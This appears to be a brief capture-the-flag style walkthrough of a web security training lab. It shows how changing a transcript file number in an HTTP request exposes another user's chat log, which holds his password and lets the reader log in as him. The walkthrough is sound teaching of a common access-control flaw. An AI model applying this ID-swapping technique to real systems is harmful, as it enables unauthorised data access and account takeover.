this is a classic IDOR, get access to a data that is not yours.
based on the description, the user chat loges are stored in the server's file system and they have a static url.
when we download a transcript if we capture HTTP request history we can see a request like this :
```
GET /download-transcript/2.txt HTTP/2
Host: 0ae500780370c10487dbd9ed001e00a3.web-security-academy.net
Cookie: session=5oZIQ2gk33eqgGEKiJuBOFxRXdVRjNay
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:152.0) Gecko/20100101 Firefox/152.0
Accept: */*
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Referer: https://0ae500780370c10487dbd9ed001e00a3.web-security-academy.net/chat
Sec-Gpc: 1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Dnt: 1
Priority: u=0
Te: trailers
```
so lets try to change the ID, in the browser or the burp. and yes if you go to`/download-transcript/1.txt` you can see Carlos password. then you can log in as Carlos and done.